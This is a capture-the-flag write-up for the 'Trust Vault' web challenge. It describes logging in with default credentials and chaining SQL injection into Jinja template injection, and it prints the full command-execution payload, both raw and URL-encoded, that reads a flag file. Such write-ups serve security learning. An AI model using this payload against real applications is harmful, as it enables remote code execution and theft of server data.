## **Challenge Name: Trust Vault**

### **Description**

Leak the server-side flag stored on disk/environment by chaining the vulnerable SQL query with the legacy Jinja rendering.

**Challenge author**: IAmPradeep

**Challenge URL**: `http://18.212.136.134:5001/`

---

### **Approach**

1. **Initial Access**  
   - Accessed the challenge URL and found a login page
   - Logged in with default credentials: `admin:admin`
   - Successfully authenticated and gained access to the application

2. **Exploring the Application**  
   - Examined the application source code and HTML comments
   - Found a `/search` page mentioned in the comments
   - Discovered that the search functionality is vulnerable to both SQL injection and SSTI (Server-Side Template Injection)

3. **Crafting the Exploit Payload**  
   - Combined SQL injection with SSTI to execute arbitrary code
   - Used SQL injection to inject a Jinja template expression
   - The payload reads the flag file from the server filesystem:
     ```
     ' UNION SELECT '{{ config.__class__.__init__.__globals__["os"].popen("cat /flag-c73b2aafe9a79b5db5ef157564055025.txt").read() }}' --
     ```

4. **URL Encoding the Payload**  
   - URL-encoded the payload for the HTTP request:
     ```
     http://18.212.136.134:5001/search?topic=%27+UNION+SELECT+%27%7B%7B+config.__class__.__init__.__globals__%5B%22os%22%5D.popen%28%22cat+%2Fflag-c73b2aafe9a79b5db5ef157564055025.txt%22%29.read%28%29+%7D%7D%27+--
     ```

5. **Executing the Exploit**  
   - Sent the crafted request to the search endpoint
   - The SQL injection bypassed the query, and the SSTI executed the command
   - Successfully read the flag file from the server

---

### **Flag**

```
PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}
```

---

